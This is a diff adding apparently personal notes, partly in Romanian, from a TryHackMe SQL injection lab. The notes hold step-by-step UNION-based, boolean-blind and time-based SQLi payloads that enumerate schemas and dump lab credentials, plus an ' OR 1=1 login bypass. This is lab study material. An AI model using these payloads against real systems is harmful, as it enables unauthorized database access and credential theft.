@@ -1,0 +1,83 @@
+https://website.thm/article?id=1
+
+UNION-based SQLi - type of In-Band SQLi
+
+modificăm după id=1
+pasul 1: ' - SQLSTATE[42000]:Syntax error or access violation: 10664 You have an error in your SQL syntax;... - SQLi detected
+pasul 2: 1 UNION SELECT 1 - SQLSTATE[21000]:Cardinality violation: 1222 The used SELECT statement have a different number of columns
+pasul 3: 1 UNION SELECT 1, 2 - same error
+pasul 4: 1 UNION SELECT 1, 2, 3 - article became visible
+pasul 5: 0 UNION SELECT 1, 2, 3 - 3 - command 3 is displayed
+pasul 6: 0 UNION SELECT 1, 2, database() - sqli_one
+pasul 7: 0 UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one' - article, staff_users
+pasul 8: 0 UNION SELECT 1, 2, group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users' - id,username,password
+pasul 9: 0 UNION SELECT 1, 2, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users - 
+admin:p4ssword
+martin:pa$$word
+jim:work123
+
+Blind-SQLi - Authentication Bypass
+' OR 1=1;--
+
+Blind SQLi - Boolean Based
+https://website.thm/checkuser?username=admin
+Resp: {"taken":true}
+
+admin123 {"taken":false}
+
+admin123' UNION SELECT 1;-- false
+admin123' UNION SELECT 1, 2;-- false
+admin123' UNION SELECT 1,2 ,3;-- true
+admin123' UNION SELECT 1, 2, 3 where database() line '%';-- true (% is a wildcard)
+admin123' UNION SELECT 1, 2, 3 where database() line 'a%';-- false
+.
+.
+.
+.
+admin123' UNION SELECT 1, 2, 3 where database() line 's%';-- true
+.
+.
+.
+.
+admin123' UNION SELECT 1, 2, 3 where database() line 'sqli_three%';-- true
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like '%';-- true
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'a%';-- false
+.
+.
+.
+.
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'users%';-- true
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.columns WHERE table_schema='sqli_three' and table_name='users' and column_name like '%';-- true
+.
+.
+.
+.
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.columns WHERE table_schema='sqli_three' and table_name='users' and column_name like 'id%';-- true
+admin123' UNION SELECT 1, 2, 3 FROM information_schema.columns WHERE table_schema='sqli_three' and table_name='users' and column_name like 'a%' and column_name !='id';-- true
+.
+.
+..
+.
+found id, username, password
+admin123' UNION SELECT 1, 2, 3 from users where username like 'a%';-- true
+.
+.
+.
+.
+admin123' UNION SELECT 1, 2, 3 from users where username='admin' and password like 'a%';-- false
+.
+.
+.
+.
+password=3845
+
+Blind SQLi - Time Based
+http://website.thm/analytics?referrer=tryhackme.com
+we replace tryhackme.com with:
+admin123' UNION SELECT SLEEP(5);-- req instant rez false nr of columns
+admin123' UNION SELECT SLEEP(5), 2;-- req delayed with 5s rez true number of columns
+admin123' UNION SELECT SLEEP(5), 2 where database() like 'u%';--
+
+password=4961
+
+Out-of-Band SQLi
